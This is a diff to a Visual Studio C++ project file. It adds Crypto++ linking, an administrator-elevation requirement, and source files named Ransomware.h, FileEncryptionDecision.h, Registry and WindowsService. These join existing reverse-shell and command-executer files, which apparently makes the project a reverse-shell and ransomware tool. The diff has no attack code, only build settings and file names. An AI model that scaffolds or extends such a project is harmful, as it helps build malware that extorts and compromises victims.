@@ -104,15 +104,16 @@
       <SDLCheck>true</SDLCheck>
       <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
-      <AdditionalIncludeDirectories>"C:\Program Files\boost\boost_1_81_0\boost_1_81_0";</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>C:\Program Files\boost\boost_1_81_0\boost_1_81_0;C:\Program Files\boost\cryptopp</AdditionalIncludeDirectories>
       <LanguageStandard>stdcpp17</LanguageStandard>
-      <RuntimeLibrary>MultiThreadedDebugDLL</RuntimeLibrary>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalLibraryDirectories>C:\Program Files\boost\boost_1_81_0\boost_1_81_0\stage\lib</AdditionalLibraryDirectories>
-      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalLibraryDirectories>C:\Program Files\boost\cryptopp\x64\Output\Debug;C:\Program Files\boost\boost_1_81_0\boost_1_81_0\stage\lib</AdditionalLibraryDirectories>
+      <AdditionalDependencies>cryptlib.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
@@ -135,13 +136,22 @@
     <ClCompile Include="Client.cpp" />
     <ClCompile Include="CommandExecuter.cpp" />
     <ClCompile Include="Program.cpp" />
+    <ClCompile Include="Registry.cpp" />
     <ClCompile Include="ReverseShellStandardFunctions.cpp" />
+    <ClCompile Include="WinApiUtils.cpp" />
+    <ClCompile Include="WindowsService.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="Client.h" />
     <ClInclude Include="CommandExecuter.h" />
+    <ClInclude Include="Crypt.h" />
+    <ClInclude Include="FileEncryptionDecision.h" />
     <ClInclude Include="NetworkExcetion.hpp" />
+    <ClInclude Include="Ransomware.h" />
+    <ClInclude Include="Registry.h" />
     <ClInclude Include="ReverseShellStandardFunctions.h" />
+    <ClInclude Include="WinApiUtils.hpp" />
+    <ClInclude Include="WindowsService.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
